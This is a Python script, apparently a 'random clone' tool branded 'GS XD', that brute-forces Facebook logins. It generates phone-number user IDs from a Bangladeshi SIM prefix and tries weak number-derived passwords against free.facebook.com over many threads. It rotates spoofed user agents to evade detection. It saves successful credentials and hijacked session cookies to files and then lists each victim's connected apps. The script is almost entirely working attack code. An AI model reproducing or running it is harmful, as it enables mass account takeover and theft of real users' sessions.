import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo=("""\033[1;97m
  ██████╗ ███████╗    ██████╗     ██╗  ██╗
██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
 ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
\033[1;92m╔═════════════════════════════════════════╗
\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
\033[1;92m║ ᗙ  Version  : 0.3                       ║
\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
\033[1;92m╚═════════════════════════════════════════╝""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
      print(f'%s{P}[%s�%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[] %s  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
       

def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/gsriyad11/')
    print(logo)
    print("\033[38;5;46--------------------------------------------")
    print("\x1b[1;91m⧼ WELCOME MY FRIENDS RANDOM CLONE ENJOY ⧽")
    print("\033[38;5;46--------------------------------------------")
    print('\033[1;32m[+] SIM CODE BD=> 016 • 017 • 018 • 019 • 013')
    print("\033[38;5;46--------------------------------------------")
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("\033[38;5;46--------------------------------------------")
    print('[+]  2000 • 5000 • 10000 • 15000• 50000 ')
    print("\033[38;5;46--------------------------------------------")
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as turag:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print("\033[38;5;46--------------------------------------------")
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'203040']
            turag.submit(rcrack,uid,pwx,tl)
    print("\033[38;5;46--------------------------------------------")
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print("\033[38;5;46--------------------------------------------")
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sGS XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
   		 'method': 'GET',
		    'scheme': 'https', 
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   		 'accept-language': 'en-US,en;q=0.9',
   		 'cache-control': 'max-age=0',
 		   'sec-ch-prefers-color-scheme': 'light',
		    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
   		 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[GS XD-OK] {uid} • {ps}" '  \n\033[1;33m [🍪]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [⚠️] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/GSXD RM2-OK-BD COOKIES.txt', 'a').write( uid+' | '+ps+' | ' +coki+ '\n')
                open('/sdcard/GSXD RM2-OK-BD.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[GS XD-CP] {uid} • {ps}")
                open('/sdcard/GSXD RM2-OK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()